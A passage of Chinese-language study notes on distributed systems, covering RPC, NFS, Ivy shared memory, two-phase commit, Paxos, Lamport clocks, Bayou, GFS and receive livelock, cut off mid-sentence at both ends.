希望能让分布式编程写起来就像在单点系统中一样，提供“透明性”。\n抽象 # 首先面临的问题就是，在不同机器上对数据的表示不同，例如 32 位 / 64 位、小端法 / 大端法等等。因此，在数据传递时，必须使用一种和机器无关的数据表示方式，即 Interface Description Language。\nIDL 所做的事不外乎两件：\n将不同编程语言原生的数据类型，序列化为机器无关的字节流以在网络上传递（反之同理） 在客户端上使用 stub 将请求发送至服务端 例如，对于 Sun RPC 来说，IDL 就是 XDR，也是在 CW1 中使用的 IDL。首先在 proto.x 中编写 API 定义，随后 rpcgen proto.x 自动生成代码。\n🌰 NFS # 在 NFS 中，Client 本质上就是针对文件 syscall 的一个 RPC stub。此时，syscall 的参数、返回值都没有受到影响，提供了一定程度的透明性。\n然而，这种透明性仅仅是形式上的。如果只有形式上的透明性而没有语义上的透明性，现有的代码尽管能够运行，却会产生错误的结果。所谓语义透明性，即同样的调用是否在 NFS 和 Unix 本地文件系统上表现一致。显然，NFS 没能完全提供这种语义透明性：\n在 Unix 上，只有文件不存在时 open() 才会失败；在 NFS 上，如果服务器宕机，open() 也会失败，甚至可能一直挂起 在 Unix 上，close() 不可能失败；在 NFS 上，调用 close() 时会触发批量写操作（也就是含有隐式的 write() ），在 Server 空间不足时可能失败 在 NFS 上，假如 Client 发送重命名请求，Server 完成了重命名但未能发送响应就宕机了，那么在 Server 恢复后 Client 的重传会得到“文件不存在”的响应；这在 Unix 上不可能发生 在 Unix 上，如果 A 打开文件后该文件被 B 删除，A 依然能继续读文件；在 NFS 上，A 则无法再读该文件 第一个问题并不是 NFS 特有的，而是分布式系统均面临的问题；而后三个问题虽然可以修复以提升语义透明性，但都需要付出性能的代价。同理，提升性能也常常需要牺牲一部分一致性，例如上文提及的 close-to-open consistency，并不是什么时候都能提供足够强的一致性。\n异常处理 # RPC 需要处理类似服务端宕机、网络丢包等单点系统中不存在的异常，并采用 At-most-once 的执行策略。这是因为，如果响应丢包了，客户端会重传已经执行过的请求，此时如果操作具有幂等性则不会出问题，但如果是类似于充值 / 收费等请求，再次执行显然会带来大麻烦。因此，服务端可以维护 replay cache，使得收到重复请求时直接返回 cache 中的值，而不是再执行一次。\nIvy # RPC 对于提升透明性的尝试基本失败了，它显式的通信方式需要开发者小心地定义节点间的通信接口，没能提升太多透明性。我们转而思考，能不能使用一种隐式的通信方式来达到这一目的呢？分布式共享内存提供了这样一种可能性。\nIvy 创建了一种所有节点共享同一块内存的幻象，隐藏了在访问其他节点内存时底层的网络传输，从而实现隐式的通信。当然，既然用到网络，就要面临网络带来的性能、正确性、一致性等问题……\n因为 Ivy 让分布式系统的节点“共享”同一内存，我们不妨将各节点具象为 CPU。首先需要解决的问题就是怎么把程序的不同部分交给不同 CPU 去执行，并确保正确性。\n现代 CPU 并不会按指令顺序来逐条执行指令。所谓正确性，即执行结果看起来就像是指令逐条执行后产生的结果一样。\n如果我们让每个 CPU 都持有一份全部共享内存的复制，那么读内存会非常快。然而，写内存则需要将写操作引入的改变传播到其他 CPU，而网络延迟在这里是不可忽视的。本地读和异地写的时间差，以及节点间网络延迟的差异，都会使得变量值的变化在时间上不一致，从而破坏正确性。因此，这种方案不可行，每个 CPU 必须持有共享内存的一部分而不是全部。\n这就引出了如何划分内存给 CPU 的问题。容易想到，固定的划分方法无法顾及局部性，势必会效率低下。而动态的划分方法——比如 CPU 对某个页进行读写时将其移动到 CPU 上——不能处理多个 CPU 读同一个页的情况。\n因此，我们可以考虑仅仅在写时移动页。而当 CPU 需要读异地内存时，只需要找到最后写该页的 CPU 并复制一份只读的拷贝。\n机制简介 - 中心化 Manager # Ivy 就采用了类似的思想，用中心化的 Manager 管理页的分配，下面用例子阐释其中的机制。假设存在三个 CPU，其中第三个 CPU 同时还是 Manager。每个 CPU 维护自己的 page table，Manager 则额外维护一个 info table。\nptable lock access owner CPU0 CPU1 CPU2 info lock copy_set owner Manager lock 列用来锁定表的编辑权限，access 可以为 R / W / nil 表示 CPU 对该页有读 / 读写 / 无权限，owner 则标志当前 CPU 是否为最后写该页的 CPU。最后，info 表中 copy_set 维护了该页的所有只读拷贝，owner 保存了最后写该页的 CPU 名称。\n注意这里每个 CPU 的 ptable 和 Manager 的 info table 都被简化到了一行，即对应某一特定的页。\nCPU1 读 CPU0 的页 # 假设初始状态如下，页为 CPU0 所拥有：\nptable lock access owner CPU0 W ✅ CPU1 nil CPU2 nil info lock copy_set owner Manager {} CPU0 现在，CPU1 想要读取该页。于是它首先 lock 了自己 ptable 中对应的行，向 Manager 发送 read query。Manager 接收后，lock 自己 info 中对应的行，将 CPU1 加入 copy_set。\nptable lock access owner CPU0 W ✅ CPU1 ✅ nil CPU2 nil info lock copy_set owner Manager ✅ {CPU1} CPU0 随后，Manager 向 Owner 也就是 CPU0 发送 read forward。CPU0 接收后，lock ptable，将 access 改为 R。\nptable lock access owner CPU0 ✅ R ✅ CPU1 ✅ nil CPU2 nil info lock copy_set owner Manager ✅ {CPU1} CPU0 随后，CPU0 向 CPU1 发送 read data 后 unlock ptable。CPU1 接收后，向 Manager 发送 read confirm，并将 access 改为 R，最后 unlock ptable。Manager 收到后，也 unlock info。\nptable lock access owner CPU0 R ✅ CPU1 R CPU2 nil info lock copy_set owner Manager {CPU1} CPU0 CPU2 写 CPU0 的页 # 书接上回，此时 CPU2 想写 CPU0 的页，那么它会 lock ptable，向 Manager 发送 write query。Manager 接收后，lock info，并向 copy_set 中的 CPU1 发送 invalidate，以撤销 CPU1 的读权限。CPU1 接收后，lock ptable 并将 access 改为 nil。\nptable lock access owner CPU0 R ✅ CPU1 ✅ nil CPU2 ✅ nil info lock copy_set owner Manager ✅ {CPU1} CPU0 随后，CPU1 向 Manager 发送 invalidate confirm 并 unlock ptable。Manager 接收后，从 copy_set 中移除 CPU1，向 Owner 即 CPU0 发送 write forward。\nptable lock access owner CPU0 R ✅ CPU1 nil CPU2 ✅ nil info lock copy_set owner Manager ✅ {} CPU0 CPU0 接收后，lock ptable，将 access 设为 nil 并放弃 Owner 身份，最后向 CPU2 发送 write data。\nptable lock access owner CPU0 ✅ nil CPU1 nil CPU2 ✅ nil info lock copy_set owner Manager ✅ {} CPU0 随后，CPU0 unlock ptable。CPU2 接收后，将 access 设为 W 并成为新的 Owner，最后向 Manager 发送 write confirm 并 unlock ptable。\nptable lock access owner CPU0 nil CPU1 nil CPU2 W ✅ info lock copy_set owner Manager ✅ {} CPU0 Manager 接收后，将 owner 设为 CPU2，最后 unlock info。\nptable lock access owner CPU0 nil CPU1 nil CPU2 W ✅ info lock copy_set owner Manager {} CPU2 可以注意到，ptable 的锁的存在本质上防止了并发写的发生，使得写操作必须是原子的。\n我们也可以将 copy_set 移动至每个 CPU 上而不是放在 Manager 上，使得 confirm 类的消息不需要再被发送。此外，还可以使用分布式 Manager 进一步提升性能。\n两个 CPU 同时写同一页 # 根据上面的写操作流程，不难发现同时写同一页是不被允许的（例如，不能有两个 Owner / copy_set 一致性等等），因此写操作必须是原子的。这种原子性实际上得益于 Ivy 的循序一致性。\n循序一致性 # 所谓满足循序一致性，即在多 CPU 环境下存在一种包含所有 CPU 的指令的序列使得：\n所有 CPU 看到的结果与序列的顺序是一致的，例如对一个地址的读操作一定会读取到对该地址最近一次写操作所写入的值； 在序列中，每个 CPU 的指令维持原顺序 这两个要求都十分符合直觉。如果上面的定义不便于理解，可以简单理解为在一个 CPU 上的多个线程的预期行为，两者是类似的。\nLamport 则证明，只要满足以下两个条件，就能满足循序一致性：\n每个 CPU 按指令顺序，依次执行读写指令 对内存中的每个位置的读写指令，也按指令顺序依次执行 根据这两个条件，我们可以发现 Ivy 是满足循序一致性的。\n与 RPC 对比 # 相比 RPC，分布式共享内存的优点在于：\n提供了更强的透明性 使得分布式系统编程更为容易 然而，RPC 同样具备分布式共享内存欠缺的优点：\n更好的隔离性 对通信更可控 对网络延迟容忍度更高 更容易移植到不同平台 2PC # NFS 和 Ivy 都没有处理系统中节点故障的问题。在一些场景下（比如银行转帐），我们希望当参与的节点故障时，所有参与的节点要么都完成状态变更，要么都没有状态变更。比如，我们显然不希望发起转账的节点被扣除了余额，而收到转账的节点没有增加余额。\n2PC（Two-Phase Commit）即两阶段提交，通过一种非常简单的思路来确保系统中的节点能达成共识。如果这种 all-or-nothing 的语义能够被正确执行，即要么全 commit 要么全 abort，那么就达成了 Safety 的目标；如果在没有故障的情况下能尽快全 commit，并在出现故障的情况下尽快决定是 commit 还是 abort，那么就达成了 Liveness 目标。显然，Safety 和 Liveness 两者之间需要权衡。\n为此，我们需要引入交易协调者 TC。假设系统中只有两个节点 A 和 B，那么 TC 先向两者发送 prepare 消息。A 和 B 随后回复他们是否能够 commit。如果 TC 收到了两个 Yes，那么就会向两者发送 commit 消息；如果 TC 收到了至少一个 No，那么就会向两者发送 abort 消息。最后，A 和 B 根据 TC 的指令完成相应动作。\n我们可以很容易看出，上述做法一定能保证 Safety。但是，如果：\n任意节点（TC / A / B）接收消息时超时了（宕机、丢包种种原因） 任意节点重启了 我们都无法保证 Liveness 了，因为 TC 可能在能够 commit 的情况下选择了 abort。\n超时的情况 # 为了处理超时的情况，确保 Safety 的前提下尽量保证 Liveness：\n我们可以让 TC 等待 Yes / No 消息超时的时候选择 abort 来尽快作出决定，但此时依然有可能在能 commit 的情况下选择了 abort，过于保守。\n我们可以让 A / B 等待 commit / abort 消息超时的时候自动选择 commit，但由于另一方可能回复了 No，这样很可能失去 Safety。\n我们可以让 A / B 等待 commit / abort 消息超时的时候自动选择 abort。不失一般性，假如 B 之前回复了 No，那么超时自动 abort 不会出问题，也能保证 Liveness；但如果 B 之前回复了 Yes，那么 TC 就有可能收到两个 Yes，然后给 A 发送 commit，而给 B 发送的 commit 没有送达。此时 A 选择 commit 而 B 自动 abort 了，失去了 Safety！\n至此，我们解决了问题的一半：B 如果之前回复了 No，那么只要超时自动 abort 就好了。\n而如果 B 之前回复了 Yes，那么它可以向 A 发送 status 消息，询问 A 的状态：\n如果 A 没有回复，B 无法决定，只能继续永远等 TC 的消息； 如果 A 收到了 commit / abort 并回复给了 B ，B 就做相同的决定； 如果 A 还没有回复 Yes / No，两者都 abort（此时 TC 不可能决定全 commit）； 如果 A 没收到 commit / abort 但之前回复了 No，两者都 abort； 如果 A 没收到 commit / abort 但之前回复了 Yes，B 同样无法决定，因为无法判断 TC 是不是收到了两者的 Yes 并决定 commit 了。 因此，我们发现即使采用了这样的终止协议并保证了 Safety，Liveness 依然无法保证，TC 宕机 / TC 的消息丢了的情况下，A / B 依然需要永远等待 TC。\n重启的情况 # 重启的 TC 可能不知道自己发送过 commit，重启的 A / B 可能不知道自己发送过 Yes，结合丢包的可能性，这使得作出能保证 Safety 的决定也不那么容易了。\n对于这类问题，分布式系统采用的一种通用方案就是借助持久化存储。TC 发送 commit 前先写一条记录到磁盘，A / B 在发送 Yes 前也先写一条记录到磁盘，就能使状态被保留下来。\n因此，只需要：\nTC 重启后，如果磁盘上没有 commit 消息，就 abort； A / B 重启后，如果磁盘上没有 Yes 消息，就 abort； A / B 重启后，如果磁盘上有 Yes 消息，就使用上述的终止协议作决定 FLP Result # 分析了 2PC 协议之后，我们发现尽管它能保证 Safety，但却不能在所有情况下保证 Liveness。实际上，根据 FLP Result，异步消息传递式的分布式系统中，只要有一台机器存在宕机且不恢复的可能（crash-failure），就不存在确定性的共识算法，也就是说不可能同时保证 Safety 和 Liveness。\nPaxos # 称 Paxos 为分布式领域最重要的算法应该不会有太大争议。Paxos 实际上可以认为是 2PC 的升级版，因为两者都是为了解决共识问题，只不过 Paxos 通过更复杂的机制获得了更高的可用性。在之前介绍的案例中（NFS、Ivy、2PC）其实都没有将可用性纳入考量。\n共识算法 # 需要注意的是，Paxos 是共识算法而不是一致性算法，尽管这两个概念很相似。共识指的是系统中的节点对某个 / 某些变量的值、或者是某个概念、某个行动能够达成共识，而一致性则指的是不同的分布式数据库节点上，存储的数据是否一致。\n🌰 Primary 选举 # 假如有这样一个场景：我们要选择一个节点作为 primary，负责接收客户端请求并分发给其他 backup 节点。但是 primary 的引入同时也会引入单点故障问题，此时可能就需要选出一个新的 primary，这时就会极易产生多于一个 primary。在这个场景下，Paxos 要解决的问题就是：确保所有节点最终只会选出一个 primary。而对于其他不同场景，Paxos 解决的问题也可以不同。\n一个很自然的想法是给每个节点预先编号，当前存活的节点中编号最小的当选。这就需要所有节点对“当前存活的节点集合”这个值达成共识。然而未必所有节点都能够正常地给出自己的反馈，因此只需要某个值被超过半数节点同意，我们就认为节点关于这个值达成了共识。\n这实际上表明，Paxos 能成功执行必须要至少半数以上的节点存活。\n共识协商 # 由于可能出现网络丢包和网络分区，单纯的互 ping 来确定哪些节点存活是行不通的。为此，Paxos 引入了 Leader 机制。当一个节点决定成为 Leader 后，它会向包括自身在内的所有节点广播一个 proposal，其中包含一个 proposal 序号 n 和相应的值 value（在这个例子里，是存活节点集合，下不赘述）。n 必须是全局唯一的，一般取目前存在的最大的 n 的值 + 1。\n每个节点维护三个变量：\nn_a 表示节点已经接受过的 proposal 中最大的 n v_a 表示 n_a 对应 proposal 的 value n_h 记录节点所收到的 proposal 中最大的 n 当节点收到一个 proposal，并发现其序号 n' 大于 n_h 时，就将 n_h 设为 n'，并向 Leader 回复 (n_a, v_a)。\nLeader 收到了超过半数的这样的消息后，就可以查看其中是否有某个 v_a 非空：\n如果所有 v_a 都是空的，那么就自己选择一个值作为 value 否则，就选择 n_a 最大的那个消息中的 v_a 作为 value 随后，向这次回复过自己的节点广播 (n = 最大的 n_a, v = 选择的 value)。\n节点收到后，如果发现 n 大于等于 n_h，那就接受这个 proposal。所谓接受 proposal，就是设置 n_h = n_a = n，v_a = v 来更新这几条记录，随后回复一条没有内容的消息。\nLeader 收到超过半数的这样的消息后，就可以认为节点达成了共识，并向这次回复过自己的节点广播一条没有内容的消息，表示共识已达成。节点收到消息后，就知道最终达成的共识的值为 v_a。在选 primary 的例子里，v_a 集合里序号最小的节点就是公认的 primary 了。\n那么，一个节点怎么决定自己要成为 Leader 呢？很简单，只要为每个节点设置一个随机的超时时间，一旦过了这个时间依然没有来自 Leader 的消息，节点就会自己成为 Leader。\nSafety # Paxos 能保证 Safety 的关键在于：\n任何节点收到一个 n' \u0026lt; n_h 的消息后，都会直接无视，这使得即使出现多个 Leader，节点最终也只会接受那个序号最大的 proposal（注意 n 是全局唯一的） 任意两个“超过半数”的集合之间必定存在交集，这是由“超过半数”的定义得来的。这使得即使出现多个 Leader，并且都几乎获得了超过半数的支持，最终也会由这个交集中的节点（哪怕只有一个）决定要接受的 proposal 新的 proposal 会沿用现存的 n_a 最大的 proposal 对应的 value，这使得不同 Leader 发起的处于不同阶段的 proposal，无法影响到最终达成共识的 value Lamport Clock # 定义 # Lamport Clock 主要用于在没有物理时钟的情况下决定事件发生的顺序。由于没有物理时钟，不存在一个大家都认可的时间标准，因此只能使用相对的时间。Lamport 首先定义了“在……之前发生”的偏序关系，用 $\\rightarrow$ 表示：\n如果 $a$ 和 $b$ 是同一进程中的不同事件，且 $a$ 在 $b$ 之前发生，那么 $a\\rightarrow b$ 如果 $a$ 是一个进程发送某消息的事件，而 $b$ 是另一进程接收该消息的事件，那么 $a\\rightarrow b$ 如果 $a\\rightarrow b$ 且 $b\\rightarrow c$，那么 $a\\rightarrow c$ 对 $\\forall a$，有 $a\\nrightarrow a$ 如果 $a\\nrightarrow b$ 且 $b\\nrightarrow a$，那么称 $a$ 和 $b$ 是并发的 随后，对于进程 $P_i$，定义其逻辑时钟 $C_i$。事件 $a$ 发生的时间可以表示为 $C_i\\langle a\\rangle$ 或 $C\\langle a\\rangle$。对于 $\\forall a,b$，逻辑时钟定义为：如果 $a\\rightarrow b$，那么 $C\\langle a\\rangle \u0026lt; C\\langle b\\rangle$。注意因为并发事件的存在，其逆命题不成立。\n为了让时钟系统满足逻辑时钟的定义，每个进程 $P_i$ 都需要在事件发生时让 $C_i$ 加一。同时，我们要求 $P_i$ 发送的消息（发送事件为 $a$）中带有时间戳 $T_m=C_i\\langle a\\rangle$，而 $P_j$ 收到消息后，将 $C_j$ 设为 $max(C_j,T_m+1)$，从而使得在 $T_m$ 大于等于本地时钟时间时重新同步本地时钟（同步为 $T_m+1$，因为接收消息也是需要耗时的事件）。\n有了逻辑时钟，我们就可以决定事件发生的顺序，也就是定义“在……之前发生”的全序关系，记作 $\\Rightarrow$。对于进程 $P_i$ 和 $P_j$，事件 $a$ 和 $b$，如果 $C_i\\langle a\\rangle \u0026lt; C_j\\langle b\\rangle$，那么 $a\\Rightarrow b$；如果 $C_i\\langle a\\rangle = C_j\\langle b\\rangle$，我们进一步比较 $P_i$ 和 $P_j$，此时只需要有一个固定的顺序即可。例如，我们可以定义 pid 小的进程中的事件优先发生，那么假如 $P_i$ 的 pid 小于 $P_j$，则 $a\\Rightarrow b$。\n实例 # 我们可以使用 Lamport Clock 来解决分布式系统中的诸多问题。例如，假设有一种资源被一系列进程共享，且同一时间只能有一个进程获得该资源，那么我们自然希望：\n获得资源的进程必须释放资源。释放后，其他进程才能获得该资源 进程按请求资源的顺序依次获得资源 如果每个获得资源的进程最终都释放了资源，那么所有对资源的请求最终都能被满足 这里第二点的“依次”尤为重要，这也导致中心化管理机制在这里失效，因为无法准确判断请求到达的先后顺序。为了满足上述三个条件，我们可以利用 Lamport Clock 设计算法：\n每个进程维护自己的请求队列 请求资源时，$P_i$ 向所有进程发送 $T_m:P_i$ 请求消息，并将其放入请求队列 $P_j$ 收到请求消息后，将其放入请求队列并向 $P_i$ 回复一个 ACK 释放资源时，$P_i$ 将所有 $T_m:P_i$ 请求消息从请求队列中移除，并向所有进程发送 $T_m:P_i$ 释放消息 $P_j$ 收到释放消息后，将所有 $T_m:P_i$ 请求消息从请求队列中移除 $P_i$ 只有在满足如下两个条件时会获得资源： 请求队列中存在一个 $T_m:P_i$ 请求消息，并排在所有其他消息前（按全序关系 $\\Rightarrow$ 排序） $P_i$ 已经从所有其他进程接收了时间戳大于 $T_m$ 的 ACK Bayou # Bayou 是为了移动设备构建成的分布式系统设计的，而移动设备经常会遇到没有网络或者网络质量差的情况，这使得很多问题，比如数据一致性，看起来非常困难甚至不可解。Bayou 解决这些问题的手段主要是通过节点间通信，比如通过蓝牙之类的协议使得两部手机交换数据来达成一致性。这是因为 Bayou 主要想解决的问题就是严重网络分区情况下的数据读写可用性。\n🌰 会议室预订系统 # Bayou 使用了一个会议室预订系统的例子来说明协议的运作原理和场景。最终，系统需要确保同一时间段同一会议室不会被两个用户预订。为此，需要一种自动解决冲突的机制，使得不同节点上的数据同步之后能像 git 那样 merge 掉冲突。为了实现这个机制，需要节点维护一个更新操作的有序列表，并确保节点收到的更新操作是一致的、以及确保节点会按相同的顺序逐个应用这些更新操作。这样一来，数据同步就只需要像归并排序那样，合并两个有序列表即可。\n冲突合并 # 不过 Bayou 并不是仅仅用于会议室预订系统，而是一个通用的协议，因此需要考虑的问题是：什么才算冲突？这个问题的答案对于不同应用是不同的。同理，合并操作也是类似的。举个例子，对于会议室预订系统，假如我们想预订从下午一点半开始持续一小时的会议，我们会在写操作里添加这样的依赖检查和合并算法：\nquery = \u0026#34;SELECT key FROM Meetings WHERE day=12/18/95 AND start \u0026lt; 2:30pm AND end \u0026gt; 1:30pm\u0026#34; expected_result = EMPTY merge_proc = ...... 随后，Bayou 就会检查 query 的结果是否等于 expected_result ，是的话可以直接更新，否则就需要调用 mergeproc 来合并冲突。需要注意的是，依赖检查和合并算法需要是确定性的。这样一来，由于每个服务器都会按照相同顺序解决冲突，每个服务器最终获得的结果也是相同的。\n写操作 # 当一个写操作被接收时，它首先处于 tentative 状态，并且会根据其 timestamp 被排序；最终，写操作会变成 commited 状态，同样根据其被 commit 时的 timestamp 进行排序，并且必定排在 tentative 写操作的前面。这里 Bayou 使用了 Lamport Clock 来避免解决不同设备上的时钟同步问题。\n一个让人不爽但又无可奈何的事情是，当 Bayou 服务器接收到新的写操作时，之前的写操作可能不得不被撤销，然后根据新的顺序重新执行。因为新的写操作的加入，旧的写操作甚至可能出现和之前不同的执行结果。当一个写操作最后一次被执行完毕，我们就称该操作已经是稳定的了。对于预订会议室的用户来说，了解自己的预订是否已经稳定显然十分重要。\n判断稳定状态 # 那么，Bayou 服务器如何确定一个写操作是否已经稳定了呢？一种办法是用 Lamport Clock 里的 timestamp，如果一个写操作的 timestamp 已经小于任何服务器收到的新的写操作的 timestamp，那说明在这个写操作之前已经没有其他写操作了，所以一定是稳定的。但是，如果一个服务器长期断线，那么它上线的时候就会导致大量写操作重新执行。\nBayou 采用的方法是 primary commit 方法。因为 commited 排在 tentative 前面，我们可以说一个写操作被 commit 之后，只要节点已经获得了之前所有 commited 的写操作（必然成立，这是由 Bayou 按顺序传播写操作的机制决定的），那么这次就是已经是稳定的了。primary commit 即选择一个服务器作为 primary，由它来执行 commit 的操作，并将数据同步给其他服务器。这样做的好处有：\n即使 primary 出现单点故障，影响的也只是 commit，而不是正常的读写操作。 即使某些节点长期断线，也不影响 commit，因为只有 primary 能 commit。 节点接收到来自 primary 的数据同步后，就不再需要最新 commit 之前的任何记录了，因为那些记录都不可能再改变了。 最后，必须注意的是，primary 在决定 commit 顺序的时候，对于来自同一节点的若干次写操作，其原顺序必须被保留。如果在某个节点上先执行了 create，然后执行 modify，那么让 modify 在 create 前面 commit 是毫无意义的。\n可以看到，Bayou 的问题主要在于实现依赖检查和合并算法，很大程度上增加了开发 / 使用一个应用的复杂度，也并不是对所有应用都适合用这种办法。\nGFS # GFS 是谷歌设计的分布式存储系统，其设计基于如下前提：\n系统组件失效是常态，而非异常情况 从传统标准来看，需要存储的文件十分巨大，往往是 GB 级和 TB 级的 相比覆盖文件中已有的内容，在文件后追加内容更为频繁 协同设计应用程序和文件系统的 API 能提高灵活性 同时，也要考虑到所需要的文件系统的行为模式：\n由于容易出现组件失效，因此需要迅速地自动检测、容忍和恢复故障 主要存储大文件，如大于 100 M 的 读操作往往是大规模的流式读取，如大于 1 M 的；一般不会重复读取，即 Read once 写操作往往是大规模的顺序写入，而且是追加写入；一般不会重复写入，即 Write once 需要原子的并行追加写入机制，避免引入锁等开销较大的同步机制 架构 # 一个 GFS 集群中只有一个 Master 节点（可能包含多个 Master 服务器），这种中心化的方式正是为了简化整个系统的管理。Master 节点上只有文件的元数据，而多个 Chunkserver 上则是文件实际存储的地方。\n文件被分割为 64 M 的 Chunk，每个 Chunk 被 Master 分配一个 64 位的 ID。Master 节点上的元数据包括：\nNamespace 针对文件的访问控制信息 文件到 Chunk 的映射 Chunk 当前所处的 Chunkserver 值得一提的是，这些元数据都保存在 Master 的内存中，又快又简单。此外，Master 节点还负责管理 Chunk 租用、垃圾回收、Chunk 迁移等等，并通过心跳信息确认 Chunkserver 状态。\nChunk 一般会在若干个 Chunkserver 上保存一份冗余，默认是 3 个。保存的方式就是放在 Linux 文件系统里。然而，GFS 并没有像 NFS 一样尽量模仿 Unix 文件系统 API，而是自己实现了 create、delete、open、close、read、write 等常用操作。此外，还有 snapshot 和 record append 两个特有的操作，分别用于文件备份和对文件并行追加写入。\nrecord append 和常规追加写入的主要区别在于，它遵循 at least once 语义，并且追加的位置未必是文件尾部，而是由 GFS 计算决定。\n由于利用了 Linux 文件系统，Chunkserver 上不需要缓存机制；而由于流式的读取模式，GFS 客户端也不需要本地缓存文件，只需要缓存元数据即可。这使得缓存一致性不再是问题。\n读操作 # 客户端向 Master 发送 read 请求，包含文件名和 Chunk index Master 回复元数据：Chunk ID、Chunk 版本号以及副本所处的位置 客户端向最近的副本所处的 Chunkserver 发送 read 请求，包含 Chunk ID 和读取的字节范围 Chunkserver 回复实际的文件数据 可以看到，客户端和 Master 之间只有控制信息的交互，而实际的数据交互仅仅发生在客户端和 Chunkserver 之间。\n写操作 # 对于每个 Chunk 来说，某个存放了该 Chunk 副本的 Chunkserver 会成为 primary（其余均为 secondary），由 Master 向 primary 提供 60s 的租约（并更新 Chunk 版本号）。租约通过心跳信息延续，也可以被 Master 主动取消。\n客户端首先向 Master 询问 primary 和 secondary 的位置 Master 回复 primary 和 secondary 所处的位置 客户端向最近的副本所处的 Chunkserver（可能是 primary 或 secondary）发送要写入的数据，数据通过 daisy chain 的方式在 Chunkserver 间传递 当所有副本都确认接收到了数据后，客户端向 primary 发送 write 请求 primary 给该请求分配一个序号（用于在本地对写操作顺序进行排序），并通知所有 secondary 执行该 write 请求 secondary 执行后向 primary 回复执行结果 primary 向客户端回复执行结果 所谓 daisy chain，即数据在不同 Chunkserver 之间类似流水线一样一一传递的方式。这种方式不仅利用了现代网线全双工的特性，更重要的是可以配合流式传输，在尚未完全接收到全部数据时就开始向下传递数据，提高传输速率。\nrecord append 操作 # record append 操作的流程和写操作基本一致，在 primary 的逻辑上略有区别。在上述第 4 步中，primary 接收到来自客户端的请求后，会检查这次 record append 操作是否会导致 Chunk 超出最大尺寸 64 M。\n大多数情况下不会超过，因此 primary 把数据追加到自己的副本内，通知 secondary 也这么做，然后通知客户端执行结果 而如果超过了，那么 primary 会将当前 Chunk 先填满，通知 secondary 也这么做，然后通知客户端重新发送 record append 请求。这样，当客户端第二次发送请求时，就不会再出现超出最大尺寸的情况了 那么，如果一部分 secondary 在追加写入时成功了，另一部分失败了呢？毫无疑问，这会使得 primary 通知客户端执行失败了，从而让客户端再次发送 record append 请求。此时就可能会出现一种现象，即有些副本上该数据已经被写入了多次，而在有些副本上则只写入了一次。这看起来很混乱，但实际上就是 at least once 的语义。\n一致性模型 # 首先可以肯定的是，元数据的变更是原子的，毕竟只有一个 Master 节点。由于 Master 会维护元数据变更的日志并同步到远程服务器，即使 Master 重启之后依然可以重放日志来恢复元数据，从而恢复整个文件系统。\n但对于数据变更而言就要复杂很多。GFS 定义了两个一致性指标：\nconsistent 意味着，一个文件区域上的内容对任何客户端而言都是相同的，无论它们是从哪个副本中读取的 defined 意味着，在写操作或 record append 操作后，一个文件区域不仅是 consistent 的，而且任何客户端都能看到对其的所有修改操作 根据这两个指标，我们可以得到：\nWrite Record Append 串行修改成功 defined defined interspersed with inconsistent 并行修改成功 consistent, undefined defined interspersed with inconsistent 修改失败 inconsistent Inconsistent 对于成功的并行写操作，尽管 GFS 可以保证文件区域内容一致，但由于 primary 对并行操作的排序未必和实际发起操作的顺序一致，客户端未必能看到一致的修改操作记录，因此 defined 是无法保证的。因此 GFS 设计者不建议使用 concurrent write。\n而对于成功的串行或并行 record append 操作，GFS 能通过 at least once 语义和 primary 对操作的排序保证存在 defined 区域，但 defined 区域之间可能会存在 inconsistent 的区域。这其实就是上文 record append 操作流程中介绍的部分副本上写入失败引起的混乱结果导致的。\n这种语义看起来相当奇怪，因此应用程序在编写时也需要针对这种语义进行特殊处理。\n应用程序 # 在执行 record append 时，应用程序需要包含一个 checksum。这样在读取数据时，就可以比较容易地分辨哪些数据是填充数据、哪些数据是有效数据。而如果应用程序不能容忍重复读取到同一份数据，就需要在 record append 时包含一个 unique ID 来辅助去重。\n组件失效 # 如果 Master 失效，那么如上文所述，它会在重启时重放日志来恢复 Namespace 信息以及文件到 Chunk 的映射信息。随后，它询问 Chunkserver 其持有的 Chunk，从而恢复 Chunk ID 到 Chunkserver 的映射信息。这一映射信息是通过询问 Chunkserver 恢复的，因为它本来就没必要存在 Master 上。\n根据版本号不同，Chunkserver 上可能会存在更旧或更新的 Chunk 副本。更旧的副本会被认为是过期的，会被忽略，且会在垃圾回收时被移除；更新的副本则会使得 Master 也采用该副本的版本号。\n而如果 Chunkserver 失效，Master 因为收不到心跳信息会发现这一点并减少对应的副本数量。随后，Master 在后台重新复制缺少的这些副本，缺少的越多优先级越高。\n文件删除 # 当客户端删除文件时，Master 记录删除日志并将文件重命名为“文件名-删除时间戳”的形式，从而避免向多个副本发起多个删除请求，影响性能。同时，Master 在后台扫描文件 Namespace，当扫描到已经被删除超过 3 天的文件时才会真正执行删除操作，并删除对应的元数据。同理，Master 也会扫描 Chunk 的 Namespace，并通知 Chunkserver 删除未被引用的 Chunk。\nReceive Livelock # 影响性能的因素有很多。硬件常常能决定性能的上限，而不当的软件层面的设计却无法使硬件充分发挥其性能。相反，良好的设计则能使性能尽可能逼近这一上限。\n这里讨论的 Receive Livelock，就是在中断驱动的系统中，当过量的请求到达时，系统忙于通过中断处理请求，而无法执行真正有用的其他操作。和 Deadlock 相反，系统并没有卡死在一个状态上，但两者的效果是相同的。\n轮询与中断 # 在介绍 Receive Livelock 的例子前，我们需要先了解一些背景知识。当 IO 设备完成一些工作时、或是发生一些事件时，需要通知 CPU：比如收到网络包、完成磁盘读取、收到键盘输入等等。这种“通知”通常是通过两种方式实现：\n轮询：CPU 每隔一段时间就询问 IO 设备是否有事件发生，这是一种同步的方式 中断：发生事件时，IO 设备向 CPU 发送信号，这是一种异步的方式 乍一看，似乎显然是后者效率更高，然而实际上未必如此。要判断需要使用哪种方式，我们需要考虑两点：处理事件的延迟时间和 CPU 的负载。\n对于轮询来说，要降低处理延迟，就需要提高轮询频率，但这会增加 CPU 负载。因此，使用轮询的场景，是处理那些经常发生、并对处理延迟要求较高的事件。注意这里的“经常”采用的是 CPU 的时间尺度，也就是微秒至毫秒级的。\n而中断相反，适合处理发生不频繁、且处理延迟要求不高的事件。中断发生时，如果中断优先级 IPL 高于 CPU 优先级，那么 CPU 会保存当前运行程序的上下文、跳转到内核中的中断处理程序 ISR 对中断进行处理、最后恢复运行程序的上下文并继续。可以发现，中断带来的潜在问题就是对其他系统任务的抢占，也就是引起 Receive Livelock 的根因。\n我们知道，磁盘 IO 必定是由 CPU 自己发起的，因此磁盘 IO 导致的中断频率实际上是 CPU 可控的，然而网络 IO 则没有这一限制。而且，许多应用使用的多媒体传输协议或是 RPC 协议往往基于 UDP 